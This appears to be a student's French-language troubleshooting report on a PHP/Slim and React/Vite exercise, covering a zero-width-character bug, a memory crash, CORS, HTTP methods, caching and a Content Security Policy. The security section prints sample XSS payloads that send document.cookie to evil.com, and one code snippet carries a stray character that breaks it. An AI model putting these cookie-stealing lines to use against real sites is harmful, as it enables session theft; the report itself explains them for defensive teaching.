# Rapport de Résolution des Problèmes - Sprint 1 Pop Quiz - Karrouach Ansar

## Chapitre 1: Backend

### ⚠️ Gestion des Erreurs

#### Problème Identifié

La page `http://localhost:8888/broken` retourne une erreur HTTP 500 sans message d'indication visible.

#### Analyse de l'Erreur

- **Cause racine** : Faute de frappe dans `backend/index.php` au niveau du gestionnaire de route `/broken` : `$response->getBody()->wr​ite("Hello world!");` contient un caractère invisible (espace de largeur nulle, U+200B) entre `wr` et `ite`, rendant la méthode invalide.
- **Comportement** : Erreur fatale PHP ("Call to undefined method"), mais `display_errors` est désactivé, et les erreurs sont loggées dans `/tmp/sprint1-php-error.log`.
- **Vérification** : Consultez le log pour l'erreur exacte.

#### Solution Proposée

Corrigez la méthode en supprimant le caractère invisible.

```php
$app->get('/broken', function (Request $request, Response $response, $args) {
    /** @disregard P1013 because we're just testing */
    $response->getBody()->write("Hello world!");
    return $response;
});
```

### 🔄 Gestion des Connexions Simultanées

#### Problème Identifié

Le serveur crash lors du test Apache Benchmark avec des connexions simultanées sur la route `/crash`.

**Test effectué:**

```bash
ab -n 200 -c 10 http://localhost:8888/crash
```

#### Analyse de l'Erreur

**1. Problème de gestion de fichier manquant:**

```php
$logEntries = file($logFile);
```

Si le fichier `request_log.txt` n'existe pas, `file()` retourne `false`, ce qui provoque une erreur lors de `count($logEntries)`.

**2. Code problématique d'allocation mémoire:**

```php
if (count($logEntries) > 0xA) {  // Si plus de 10 lignes
    $contentClear = str_repeat('A', 0x9FFFF0);  // Tente d'allouer ~10 MB
    file_put_contents($logFile, $contentClear);
}
```

**Problèmes identifiés:**

- `0x9FFFF0` = 10,485,744 octets (~10 MB)
- Limite mémoire initiale: `ini_set('memory_limit', '8M')`
- **Dépassement de mémoire**: 10 MB > 8 MB → Crash fatal
- Lors de connexions simultanées, plusieurs processus tentent cette allocation en même temps

#### Solution Implémentée

**1. Vérification de l'existence du fichier:**

```php
$logEntries = file($logFile);

if ($logEntries === false) {
    $logEntries = [];
}
```

Cette vérification évite les erreurs lorsque le fichier n'existe pas encore.

**2. Augmentation de la limite mémoire:**

```php
ini_set('memory_limit', '128M');  // Augmenté de 8M à 128M
```

**Justification de la solution:**

- Résout le problème de dépassement mémoire
- Permet au code existant de fonctionner correctement
- Adapte les ressources système au code plutôt que de modifier la logique métier
- Le serveur peut maintenant gérer l'allocation de 10 MB sans crash

**Alternative possible (non retenue):**
Il serait également possible d'optimiser le code en remplaçant l'allocation massive:

```php
file_put_contents($logFile, '', LOCK_EX);  // Vide le fichier (0 octets)
```

Cependant, cette approche modifie le comportement initial du code. L'augmentation de mémoire a été privilégiée pour respecter la logique existante du système de logging.

#### Test de Validation

```bash
ab -n 200 -c 10 http://localhost:8888/crash
```

**Résultat:** ✅ Le serveur gère maintenant toutes les requêtes sans crash. Les 200 requêtes avec 10 connexions simultanées sont traitées avec succès.

---

## Chapitre 2: Frontend

### 🔍 Appel Fetch / XHR sur la Route /fetch

#### Problème Identifié

Requêtes XHR bloquées par CORS:

```
Access to fetch at 'http://localhost:8888/fetch' from origin 'http://localhost:5173'
has been blocked by CORS policy: No 'Access-Control-Allow-Origin' header is present
```

Erreur 401 Unauthorized - authentification manquante.

#### Solution Implémentée

**1. Middleware CORS dans backend/index.php:**

```php
$app->add(function ($request, $handler) {ß
    if ($request->getMethod() === 'OPTIONS') {
        $response = new \Slim\Psr7\Response();
    } else {
        $response = $handler->handle($request);
    }

    return $response
        ->withHeader('Access-Control-Allow-Origin', 'http://localhost:5173')
        ->withHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization')
        ->withHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
});
```

**Point clé:** La gestion du preflight OPTIONS est essentielle. Le navigateur envoie automatiquement une requête OPTIONS avant la vraie requête GET quand un header Authorization est présent.

**2. Configuration frontend (.env + fetch.lazy.jsx):**

```javascript
// .env
VITE_API_TOKEN=dXNlcm5hbWU6cGFzc3dvcmQ=

// fetch.lazy.jsx
headers: {
    Authorization: `Basic ${import.meta.env.VITE_API_TOKEN}`,
}
```

**Résultat:** ✅ Requêtes XHR réussies avec authentification Basic Auth.

### 🛑 Problème des Appels XHR sur la Page /users

#### Problème Identifié

La page `/users` échoue avec une erreur 405 (Method Not Allowed) et génère une erreur de parsing JSON:

```
POST http://localhost:8888/users 405 (Method Not Allowed)
SyntaxError: Unexpected token 'M', "Method Not Allowed" is not valid JSON
```

#### Analyse de l'Erreur

**Cause racine:** Incohérence entre la méthode HTTP utilisée et la méthode acceptée.

**Backend (`backend/index.php`):**

```php
$app->any('/users', function (Request $request, Response $response, $args) {
    if ($request->getMethod() === 'POST') {
        $response->getBody()->write("Method Not Allowed");
        return $response->withStatus(405);  // ❌ Rejette POST
    }
    // ... Retourne les utilisateurs pour GET
});
```

**Frontend (`users.lazy.jsx`):**

```javascript
fetch(`${import.meta.env.VITE_API_URL}/users`, {
	method: 'POST', // ❌ Utilise POST
}).then((response) => response.json()); // ❌ Tente de parser "Method Not Allowed" comme JSON
```

**Problèmes identifiés:**

1. Le frontend envoie une requête POST
2. Le backend rejette POST avec un statut 405 et un message texte brut
3. Le frontend tente de parser le message d'erreur texte comme JSON → SyntaxError

#### Solution Proposée

Corriger la méthode HTTP dans le frontend pour utiliser GET (méthode acceptée par le backend):

```javascript
useEffect(() => {
	fetch(`${import.meta.env.VITE_API_URL}/users`) // GET par défaut
		.then((response) => response.json())
		.then((data) => console.log(data));
}, []);
```

**Justification:**

- Le endpoint `/users` est conçu pour retourner la liste des utilisateurs via GET
- Aucune raison fonctionnelle d'utiliser POST pour récupérer des données (violation des conventions REST)
- GET est la méthode appropriée pour les opérations de lecture

#### Résultat

✅ La requête réussit avec un statut 200
✅ Les données JSON sont correctement parsées
✅ La liste des utilisateurs s'affiche dans la console:

```json
[
	{
		"id": 1,
		"nom": "Jean Dupont",
		"email": "jean.dupont@example.com",
		"role": "administrateur"
	},
	{
		"id": 2,
		"nom": "Marie Durand",
		"email": "marie.durand@example.com",
		"role": "utilisateur"
	},
	{
		"id": 3,
		"nom": "Pierre Martin",
		"email": "pierre.martin@example.com",
		"role": "utilisateur"
	}
]
```

### 🚀 Optimisation du Téléchargement des Assets

#### Problème

Les assets (JS, CSS, Images, Fonts) semblent être téléchargés à chaque recharge de page au lieu d'utiliser le cache du navigateur.

#### Identification du Problème

**En mode développement (`npm run dev`)** :

Les fichiers utilisent des query strings qui changent :

- `react.js?v=0eced183`
- `chunk-S2TLTWlO.js?v=0eced183`
- `@tanstack_react-router.js?v=0eced183`

Ces paramètres `?v=timestamp` changent à chaque redémarrage du serveur de développement, ce qui peut donner l'impression que les fichiers sont retéléchargés.

**Observation dans DevTools :**

Cependant, en inspectant l'onglet Network :

- Les fichiers affichent le statut `200 OK` avec la mention `(memory cache...)`
- Cela signifie que le navigateur **sert les fichiers depuis le cache mémoire**
- **Aucun téléchargement réel n'est effectué**

**Statuts de cache possibles :**

- **200 (memory cache / disk cache)** : ✅ Fichier servi depuis le cache local, aucune requête réseau
- **304 (Not Modified)** : ⚠️ Requête envoyée au serveur, mais fichier non retéléchargé
- **200 (sans cache)** : ❌ Fichier réellement téléchargé depuis le serveur

#### Analyse de la Solution

**Vite gère le cache automatiquement :**

Test de build en production sans configuration particulière :

```bash
npm run build
```

**Résultat du build par défaut :**

```
dist/assets/index.lazy-BXxjEpFm.js       0.20 kB
dist/assets/users.lazy-Bgjf-oPX.js       0.29 kB
dist/assets/security.lazy-y5LBKf9-.js    0.32 kB
dist/assets/fetch.lazy-DwQGXWPs.js       0.35 kB
dist/assets/index-xxh-c4a2.js          243.13 kB
```

**Constat :** Vite ajoute automatiquement des hash de contenu (`BXxjEpFm`, `xxh-c4a2`, etc.) aux noms de fichiers en production.

**Fonctionnement du hash de contenu :**

- Le hash change **uniquement** si le contenu du fichier change
- Si le contenu est identique, le hash reste le même
- Les navigateurs peuvent donc cacher les fichiers indéfiniment

#### Solution : Aucune Modification Requise

**Vite gère nativement le cache busting en production :**

✅ Hash de contenu automatique sur tous les assets  
✅ Noms de fichiers uniques par version (`index-xxh-c4a2.js`)  
✅ Cache navigateur optimisé sans configuration supplémentaire

**En mode développement :**

- Les query strings `?v=` sont intentionnels pour le hot reload
- Le cache fonctionne correctement via `(memory cache)`
- Comportement normal et attendu

#### Optimisation Facultative : Code Splitting

Pour les applications déployées fréquemment avec modifications JS régulières, il est possible d'optimiser davantage avec du code splitting.

**Problème avec le build par défaut :**

- Tout le code dans un seul fichier : `index-xxh-c4a2.js` (243 KB)
- Une petite modification JS → retéléchargement de 243 KB

**Solution optionnelle - Séparation vendor/app dans `vite.config.js` :**

```javascript
export default defineConfig({
	plugins: [react(), TanStackRouterVite()],
	build: {
		rollupOptions: {
			output: {
				manualChunks: {
					'vendor-react': ['react', 'react-dom'],
					'vendor-router': ['@tanstack/react-router'],
				},
			},
		},
	},
});
```

**Résultat avec code splitting :**

```
dist/assets/vendor-react.BXn1aEkb.js   140.96 kB  ← React (change rarement)
dist/assets/vendor-router.GVvi94bD.js   46.68 kB  ← Router (change rarement)
dist/assets/index.HaE9fiaj.js           55.88 kB  ← Code app (change souvent)
```

**Avantage :** Lors d'un déploiement avec modifications JS, seul `index.js` (~55 KB) est retéléchargé, les bibliothèques restent en cache.

#### Résultat

✅ Vite gère automatiquement le cache busting en production (hash de contenu)  
✅ Aucune configuration nécessaire pour un cache optimal  
✅ Mode développement : cache fonctionne correctement via memory cache  
✅ Optimisation optionnelle : code splitting pour déploiements fréquents

### 🔐 Correction de la Faille XSS sur la Page /security

#### Problème Identifié

La page `/security` charge une image depuis une source externe non contrôlée :

```jsx
// frontend/src/routes/security.lazy.jsx
function Security() {
	return <img src='https://images.unsplash.com/photo-...' alt='' />;
}
```

L'image provient du domaine `images.unsplash.com`, un service tiers sur lequel nous n'avons aucun contrôle.

#### Analyse du Risque de Sécurité

**1. Faille de sécurité - Contenu externe non vérifié :**

- **Risque de compromission** : Si le domaine externe est piraté, il pourrait servir du contenu malveillant
- **Aucun contrôle** : Vous ne pouvez pas garantir la sécurité du contenu provenant de tiers
- **Point d'attaque potentiel** : Attaquants peuvent exploiter ces ressources externes

**2. Vecteurs d'attaque XSS possibles :**

**a) Images SVG malveillantes :**

```xml
<!-- SVG avec script intégré -->
<svg xmlns="http://www.w3.org/2000/svg">
  <script>
    // Code malveillant qui s'exécute
    document.location='https://evil.com/steal?cookie='+document.cookie;
  </script>
</svg>
```

**b) Exploitation de vulnérabilités navigateur :**

- Images spécialement conçues pour exploiter des bugs de parsers d'images
- Buffer overflow, corruption mémoire via images malformées

**c) Tracking et exfiltration de données :**

```html
<!-- L'URL de l'image peut fuiter des données sensibles -->
<img src="https://evil.com/track.gif?user=<script>document.cookie</script>" />
```

**3. Problèmes de confidentialité :**

- **Fuite d'informations** : Chaque requête externe envoie des headers (Referrer, User-Agent, IP)
- **Tracking utilisateur** : Les domaines tiers peuvent suivre vos utilisateurs
- **Man-in-the-Middle** : Attaques possibles sur les connexions externes non sécurisées

**4. Absence de Content Security Policy (CSP) :**

Sans CSP, le navigateur charge n'importe quelle ressource depuis n'importe quel domaine, sans restriction.

#### Solution Implémentée : Content Security Policy (CSP)

**Qu'est-ce que CSP ?**

Content Security Policy est un mécanisme de sécurité du navigateur qui permet de :

- Définir une liste blanche de sources autorisées pour chaque type de contenu
- Bloquer automatiquement tout contenu ne respectant pas la politique
- Prévenir les attaques XSS en limitant l'exécution de scripts non autorisés
- Protéger contre l'injection de contenu malveillant

**Configuration CSP dans `frontend/vite.config.js` :**

```javascript
import { defineConfig } from 'vite';
import react from '@vitejs/plugin-react';
import { TanStackRouterVite } from '@tanstack/router-vite-plugin';

export default defineConfig({
	plugins: [react(), TanStackRouterVite()],
	server: {
		headers: {
			'Content-Security-Policy':
				"default-src 'self'; img-src 'self' blob: data:; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; connect-src 'self' ws://localhost:5173 http://localhost:8888;",
		},
	},
});
```

**Simplité et efficacité :**

- ✅ Utilise l'option native `server.headers` de Vite
- ✅ Configuration en une seule ligne claire
- ✅ Pas besoin de plugin personnalisé
- ✅ Headers CSP envoyés automatiquement par le serveur de développement

#### Explication des Directives CSP

**`default-src 'self'`** : Par défaut, autoriser uniquement les ressources du même origine (localhost)

**`img-src 'self' blob: data:`** : 🔒 **La directive clé !**

- `'self'` : Images uniquement depuis localhost
- `blob:` : Autorise les blob URLs (images générées côté client)
- `data:` : Autorise les data URLs (images base64)
- ❌ **Bloque https://images.unsplash.com et tout domaine externe**

**`script-src 'self' 'unsafe-inline' 'unsafe-eval'`** :

- `'self'` : Scripts depuis localhost uniquement
- `'unsafe-inline'` : Nécessaire pour Vite en dev (scripts inline)
- `'unsafe-eval'` : Nécessaire pour Vite HMR (Hot Module Replacement)

**`style-src 'self' 'unsafe-inline'`** :

- `'self'` : Styles depuis localhost uniquement
- `'unsafe-inline'` : Pour les styles inline de React et Vite

**`connect-src 'self' ws://localhost:5173 http://localhost:8888`** :

- `'self'` : Connexions vers localhost
- `ws://localhost:5173` : WebSocket pour Vite HMR (Hot Module Replacement)
- `http://localhost:8888` : Backend API

#### Test de la Politique

**Avant CSP :**

```
✅ Image externe chargée depuis https://images.unsplash.com
⚠️ Aucune protection contre le contenu malveillant
```

**Après CSP :**

```
❌ Image externe BLOQUÉE par la CSP
Console : "Refused to load the image 'https://images.unsplash.com/...'
          because it violates the following Content Security Policy directive:
          "img-src 'self' data: blob:""
✅ Protection active contre les images externes
```

#### Résultat

✅ **Protection XSS active** : Images externes bloquées automatiquement  
✅ **Politique de sécurité stricte** : Seul localhost autorisé pour les images  
✅ **Compatibilité Vite dev** : HMR et hot reload fonctionnent correctement  
✅ **Sécurité renforcée** : Protection contre injection de contenu malveillant  
✅ **Respect des bonnes pratiques** : CSP suivant les recommandations OWASP

**Impact mesurable :**

- Images externes : Bloquées avec erreur CSP dans la console
- Images locales : Chargées normalement depuis `/public` ou `/src/assets`
- Data URLs et Blobs : Autorisés pour la génération d'images côté client
- Sécurité globale : Application protégée contre de nombreux vecteurs d'attaque XSS
